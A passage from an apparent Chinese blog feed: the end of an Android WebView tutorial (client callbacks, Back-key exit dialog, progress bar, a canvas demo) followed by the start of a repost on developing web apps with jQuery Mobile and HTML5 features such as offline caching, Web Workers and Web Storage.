<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<br />


<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Intercepts error message<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void onReceivedError(WebView view, int errorCode,<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; String description, String failingUrl) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Log.i(TAG, failingUrl);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Toast.makeText(activity, &quot;网页错误: &quot; + errorCode + &quot; 网页不可用&quot;,<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Toast.LENGTH_LONG).show();<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<br />


<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Intercepts form resubmission<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void onFormResubmission(WebView view, Message dontResend,<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Message resend) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Log.i(TAG, &quot;Resubmission&quot;);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Toast.makeText(activity, &quot;不可重复提交，按Back回到上级网页&quot;,<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Toast.LENGTH_SHORT).show();<br /></p>

<br />


<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<br />


<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Intercepts page started event<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void onPageStarted(WebView view, String url, Bitmap favicon) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Log.i(TAG, &quot;Page load start&quot;);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<br />


<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Intercepts page finished event<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void onPageFinished(WebView view, String url) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Log.i(TAG, &quot;Page load finish&quot;);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p> <br /></p>

<p>在Webview下，当按下Back键时，需要调用WebView中Back，访问历史页面，当没有历史页面的时候提示是否要退出。<br /></p>

<p>需要在当前Activity中重写onKeyDown函数，﻿处理Back事件﻿。<br /></p>

<p> <br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; public boolean onKeyDown(int keyCode, KeyEvent event) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Forwards the back key event to browser plugin<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((keyCode == KeyEvent.KEYCODE_BACK) &amp;&amp; mWebView.canGoBack()) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; String url;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.goBack();<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return true;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Pops up a dialog before exit<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((keyCode == KeyEvent.KEYCODE_BACK) &amp;&amp; (!mWebView.canGoBack())) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; new AlertDialog.Builder(this)<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .setTitle(R.string.title)<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .setMessage(R.string.quit_desc)<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .setNegativeButton(R.string.cancel,<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; new DialogInterface.OnClickListener() {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; @Override<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void onClick(DialogInterface dialog,<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int which) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; })<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .setPositiveButton(R.string.confirm,<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; new DialogInterface.OnClickListener() {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; @Override<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void onClick(DialogInterface dialog,<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int whichButton) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; android.os.Process<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .killProcess(android.os.Process<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .myPid());<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }).show();<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return true;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return super.onKeyDown(keyCode, event);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p> <br /></p>

<p>WebChromeClient负责处理Javascript的对话框，网站图标，加载进度条等。﻿下面的代码，在Activity上添加一个加载网页的进度条<br /></p>

<p> <br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mWebView.setWebChromeClient(new WebChromeClient() {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; public void onProgressChanged(WebView view, int progress) {<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; activity.setProgress(progress * 100);<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; });<br /></p>

<p> <br /></p>

<p>退出提示框<br /></p>

<p> <br /></p>

<p>﻿<br /></p>

<p> <br /></p>

<p> <br /></p>

<p>HTML5显示效果和页面代码：<br /></p>

<p> <br /></p>

<p>&nbsp;&nbsp;&lt;script type=&quot;application/x-javascript&quot;&gt;<br /></p>

<p>&nbsp; &nbsp; function drawText() {<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;var canvas = document.getElementById(&quot;canvas&quot;);<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;if (canvas.getContext) {<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var ctx = canvas.getContext(&quot;2d&quot;);<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;var message = &quot;First HTML5 page&quot;<br /></p>

<br />


<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;ctx.fillStyle = &quot;#FF0000&quot;;<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;ctx.font = &quot;30px serif&quot;;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; var xPosition = 20;<br /></p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; var yPosition = 30;<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;ctx.fillText (message,xPosition,yPosition);<br /></p>

<p>&nbsp; &nbsp;&nbsp; &nbsp;}<br /></p>

<p>&nbsp; &nbsp; }<br /></p>

<p>&nbsp;&nbsp;&lt;/script&gt;<br /></p>

<br />


<p> &lt;body onload=&quot;drawText();&quot;&gt;<br /></p>

<p>&nbsp; &nbsp;&lt;canvas id=&quot;canvas&quot; width=&quot;300&quot; height=&quot;300&quot;&gt;&lt;/canvas&gt;<br /></p>

<p> &lt;/body&gt;<br /></p>

<br />


<p>转自：<a href="http://www.myexception.cn/HTML-CSS/592035.html">http://www.myexception.cn/HTML-CSS/592035.html</a></td></tr></table></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[使用jquery Mobile 与HTML5开发Web App]]></title>
    <link href="http://archulate.github.io/blog/2013/02/03/jquery/"/>
    <updated>2013-02-03T18:11:25+08:00</updated>
    <id>http://archulate.github.io/blog/2013/02/03/jquery</id>
    <content type="html"><![CDATA[<!--more-->


<pre><code>&lt;p&gt;在本系列文章的开头，Kayo 曾经介绍过 Web App 的优缺点，并且说明了 HTML5 在其中起的作用，当然，Web Apps 的发展需要 HTML5 , CSS 与 JavaScript 以及后台技术的共同配合，但 HTML5 无疑为 Web Apps 发展中一些重要的方面带来主要贡献。本文要阐述的，正是 HTML5 为 Web Apps 带来的各种影响，或者说，HTML5 究竟为 Web Apps 开发带来了什么改变。&lt;/p&gt;
</code></pre>

<h2>一. jQuery Mobile 与 HTML5</h2>


<p>在具体说明 HTML5 如何使 Web Apps 开发发生改变前，首先回到本系列文章的另一个中心—— jQuery Mobile 。其实不难想象，倘若没有 jQuery Mobile 等其他移动开发框架，使用 HTML5 开发 Web Apps 实际上是一件非常困难的事，如果没有 jQuery Mobile ，开发者就必须在开发过程中独自解决至少以下几个问题：</p>


<ul>
<li>创建一个设备检测方案</li>
<li>设计出适应不同移动设备的响应式方案</li>
</ul>


<p>上面仅仅是一个开始，如果开发者希望能创建一个出色的 Web Apps ，那么还可能需要考虑以下问题：</p>


<ul>
<li>设计一套适应移动设备用户使用的 UI</li>
<li>模拟原生 Apps 的各种效果（过场动画等）</li>
<li>模拟原生 Apps 的各种操作（划动等）</li>
</ul>


<p>更加麻烦的是，即使开发者完成了上面的各项要求，也必须独自调试，确保这些效果能在大多数移动设备上正确运行，尤其是需要长期开发时，开发者需要考虑的事情就更加复杂了。因此，jQuery Mobile 等移动开发框架在开发中实际是完成了大部分 CSS 和 JavaScript 的工作，包括开发的工作和在 Web Apps 制作中更为繁琐的调试工作，而 CSS 和 JavaScript 的开发往往也是移动开发中最费时的工作，这也是开发者可以利用 jQuery Mobile 进行快速开发的原因。</p>


<p>也是因为以上的原因，这篇系列文章才会是“使用 jQuery Mobile 与 HTML5 开发 Web App”，而不是 HTML5 的独唱戏。当然，如果你需要一个完全个性化的样式，开发出自己的框架或核心主题也无妨。但对于小型的开发者，或者即使你有足够团队支持，但想要进行快速开发，使用 jQuery Mobile 等移动开发框架也会更加方便。</p>


<p>当然，实际上 jQuery Mobile 也是一个 HTML5 框架，在 jQuery Mobile 之中也应用了 HTML5 的新技术，下面开始回归本文的主题 —— HTML5 对 Web Apps 的影响。</p>


<h2>二. 你的编程方式</h2>


<p>HTML5 确实为 Web 开发者带来了很多很酷的新特性，但如果你熟悉 HTML5 的新特性，会发现大多数 HTML5 的新特性都是使用 JavaScript 进行操作，即使再加上那些不是用 JavaScript 操作的特性，使用 HTML5 开发仍然没有改变 Web 前端开发者的编程方式——依旧还是使用标签包裹内容，依旧还是使用 CSS 设计样式，依旧还是使用 JavaScript 操作元素和进行交互。这是一件很好的事，开发者无须为 HTML5 开发付出重新适应编程方式的代价，因此，你只需在旧技术中拓展学习新的技术，而并不需要推倒重来。</p>


<h2>三. HTML5 为 Web Apps 带来的提升</h2>


<p>从技术层面上说，几乎每一项 HTML5 新特性都有种为 Web Apps 而设计的意味，W3C 更明确了某些 HTML5 特性是为 Web Apps 而设的，如 W3C 文档中 &#8220;Offline Web applications&#8221; 部分正文第一段开头便是：</p>


<p>“In order to enable users to continue interacting with Web applications and documents even when their network connection is unavailable”</p>


<p>当然，在这些新特性中有些特性会格外的惊艳，让开发者为之兴奋，除了在系列文章中介绍到的离线缓存，Offline Web applications ，Web Workers 外，Geolocation ，canvas ，Audio 和 Video 等特性都让 Web Apps 发生巨大的进步。下面 Kayo 再进一步说明一下几个主要特性为 Web Apps 带来的进步。</p>


<p>关于离线缓存，Offline Web applications ，Web Workers 的详细介绍，请参考以下三篇文章：</p>


<p><a href="http://kayosite.com/web-app-by-jquery-mobile-and-html5-web-storage.html" title="使用 jQuery Mobile 与 HTML5 开发 Web App —— HTML5 Web Storage" target="_blank">《使用 jQuery Mobile 与 HTML5 开发 Web App —— HTML5 Web Storage》</a></p>


<p><a href="http://kayosite.com/web-app-by-jquery-mobile-and-html5-offline-web-applications.html" title="使用 jQuery Mobile 与 HTML5 开发 Web App —— HTML5 离线缓存" target="_blank">《使用 jQuery Mobile 与 HTML5 开发 Web App —— HTML5 离线缓存》</a></p>


<p><a href="http://kayosite.com/web-app-by-jquery-mobile-and-html5-offline-web-workers.html" title="使用 jQuery Mobile 与 HTML5 开发 Web App —— HTML5 Web Workers" target="_blank">《使用 jQuery Mobile 与 HTML5 开发 Web App —— HTML5 Web Workers》</a></p>


<h3>1. 离线缓存</h3>


<p>与很多原生 Apps 不同，Web Apps 需要通过联网加载元素，这是 Web Apps 中一个致命的缺点，如果没有网络，Web Apps 将会完全失效。但 HTML5 的离线缓存 (Offline Web applications) 却改变了这一点，离线缓存可以方便地将 HTML 文档 , CSS , JavaScript 以及图片缓存到本地端，并且在缓存成功后优先加载本地端资源，这样导致了 Web Apps 的性能可以出现两种重要提升：</p>


<p>依赖网络的 Web Apps（网络应用）可以通过离线缓存把占用带宽较高的资源缓存到本地，大大加快载入速度。同时利用缓存做出脱机时的响应状态。</p>


<p>不依赖网络的 Web Apps（本地应用，单机游戏）可以在有网络连接时把整个程序缓存到本地，以后无须网络也可以正常使用。</p>


<h3>2. Web Workers</h3>


<p>Web Workers 可以在后台运行 JavaScript ，这意味着网页在执行 JavaScript 时可以不用锁定页面的 UI ，因此，可以把进行复杂运算的处理交给 Web Workers 并在后台运行，这样可以提升 UI 的友好度，并且减少浏览器（或标签）假死的情况。这样无论是对于 Web Apps 还是普通网页都是一种很好的改进，尤其是对于以应用为主的 Web Apps 。这类 Apps 用户操作较多，对 UI 的响应能力要求也更高，并且运行在相对于 PC 配置较低的移动设备上，使用 Web Workers 可以大大提升其性能。另外，Web Workers 可以实现多线程处理，解决了 JavaScript 单线程运行的问题，Apps 的执行效率也能因此提高。</p>


<h3>3. Web Storage</h3>


<p>Web Storage 可以把一些数据存储到本地，与 cookie 相似，但数据是完全存储在本地，并且数据量大很多，可以用于存储用户的数据或应用设置，这样可以方便的读取这些数据而不占用网络，对于 Web Apps 开发来说也很实用。</p>


<p>以上这几个 HTML5 特性实质上都为 Web Apps 开发作出了同一类贡献——使到 Web Apps 相对原生 Apps 的劣势得以挽回（性能较低和依赖网络的劣势）。也许你会觉得这些特性没有 jQuery Mobile 为 Web Apps 带来的好处那么直观，但它确实从性能上提升了 Web Apps。你可以想象，离线缓存可以把大图片缓存到本地，Web Workers 使到用户操作页面时 UI 可以不用被锁定，这些特性带来的体验提升远胜于改进一个按钮的样式，改进一个栏目的布局。的确，比起外观，性能才从根本上决定了最终的用户体验。</p>


<p>如上面所述，Geolocation ，canvas ，Audio 和 Video 也为 Web Apps 开发带来很多实用的价值，但相对于前面3点特性在性能方面改进了 Web Apps ，这几点新特性则可以丰富 Web Apps 的内容形式。另外，我们再回到 jQuery Mobile ，jQuery Mobile 实在也是依赖 HTML5 建立起来，其中 HTML5 的 data- 属性则起到了至关重要的作用，jQuery Mobile 利用 data- 这个 HTML5 中新增加的自定义属性为框架建立了各种组件和功能，综上所述，HTML5 为 Web Apps 带来的改进主要是以下三个方面：</p>


<ul>
<li>使到 Web Apps 相对原生 Apps 的劣势得以挽回，这里主要是性能较低和依赖网络的劣势</li>
<li>提供了更加丰富的内容表现形式</li>
<li>提高开发效率</li>
</ul>


<p>只有这些好处了？</p>


<p>对，也就只有这些了，与 HTML4 很不相同，HTML5 更像是一个移动开发平台，但也只是一个平台，关键的开发还是需要开发者的努力。</p>


<p>特别需要指出的是，在本文系列文章开头时，Kayo 还介绍了另一种 HTML5 的新特性—— Web SQL Database ，从实用性来上说，Web SQL Database 允许开发者在本地使用 SQL 数据库（SQLite），这是个很实用的功能，但很遗憾，由于 SQL 本身并不是一套统一的标准，因此 W3C 认为 Web SQL Database 也不能成为标准，并在10年的 W3C TPAC 中把 Web SQL Database 从“工作草案”的状态变更为“工作小组报告”，这意味 Web SQL Database 也不将被 W3C 推荐（不再更新），而以 Indexed Database 取而代之。</p>


<h2>四. 需要渐进增强的设计</h2>


<p>如果你已经阅读了上面列出的三篇文章，会发现 HTML5 在不同的平台和浏览器中的兼容性并不算是十分出色，即使你的 App 只需支持一、两个平台，但 HTML5 的某些特性在这些平台中仍有可能表现出较大的差异。因此，如果开发者使用 HTML5 进行 Web Apps 开发，那么就需要进行渐进增强的设计。关于渐进式设计，这里再一次引用 Kayo 在之前的文章中写过的一段关于渐进增强设计的描述：</p>


<p>“前端设计时通过渐进增强功能来设计一直也是 Kayo 的设计想法，因为不同的平台，不同的设备有着不同的 Web 环境，因此对于一些出色的前端效果很难保证在每台设备上都呈现相同的效果，因此与其为了在所有设备上做到一样的效果而降低整体的前端样式，不如对于好的设备可以呈现更出色的效果，而基本的效果就兼容所有的设备。jQuery Mobile 的设计也是如此，核心的功能支持所有的设备，而较新的设备则可以获得更为优秀的页面效果。”</p>


<p>如上面所述，jQuery Mobile 也是渐进增强设计的，事实上每个主流的移动开发框架都是基于渐进增强设计的，但开发者使用 HTML5 开发时仍需考虑 HTML5 方面的渐进增强设计，简而言之，开发者应该为 HTML5 新特性设计好一个备用解决方案。</p>


<p>这里 Kayo 必须指出一点，渐进增强设计是必须从项目一开始就需要进行规划的设计，它意味着一个样式或功能需要同时考虑多种技术的支持情况，即考虑渐进增强设计必须从底层考虑，包括 Web Apps 功能上的设计，样式上的设计，目标用户群使用的主流平台和浏览器，这些开发者都必须从一开始就考虑清楚，决定 Web Apps 中哪些样式或功能需要考虑渐进增强，具体的解决办法又如何。</p>


<p>举一个简单的例子，使用 Web Storage 的 localStorage 存储一些用户信息，不支持 localStorage 的浏览器使用 cookie 代替，这时开发者必须考虑两个问题——存储哪些信息？信息的大小和格式？localStorage 是直接保存在本地端的，cookie 则一般由 CGI 处理程序加密后再发送到本地，因此同时考虑两种技术的支持情况，密码这类重要的信息最好还是不要存储；localStorage 键值只支持字符串，cookie 的键值形式则可以更加丰富，因此同时考虑两种技术，这些信息最好是字符串的形式，或是由其他形式转为字符串形式后再保存。这样，两种技术才能在 Web Apps 开发中互相代替，最终的效果是使到设备在不支持更好的技术时可以优雅的降级到其他技术。</p>


<h2>五. 解决方案与实例</h2>


<p>现在，读者大概已经了解到使用 HTML5 开发一个 Web Apps 的各种影响了，HTML5 的新特性并没有改变你的编程方式，但却改变了你的开发过程。因此，即使开发者已经很熟悉网站开发，但如果需要长期开发 Web Apps ，仍要针对以上各项设计一个前端解决方案。当然，具体的解决方案可以有很多，这里 Kayo 以 jQuery Mobile 与 HTML5 开发为例，说明一个快速开发的解决方案。</p>


<p>在说明解决方案之前，Kayo 首先介绍一下例子 Demo 的情况，例子是一个记事本功能的 Web Apps ，与本系列开头介绍过的<a href="http://kayosite.com/web-app-by-jquery-mobile-and-html5-principles.html" title="使用 jQuery Mobile 与 HTML5 开发 Web App ——开发原则" target="_blank">例子记事本</a>不一样，本例子中的事件输入会稍复杂一些，并且以 Mysql 数据库代替 Web SQL Database ，后台使用 PHP 。</p>


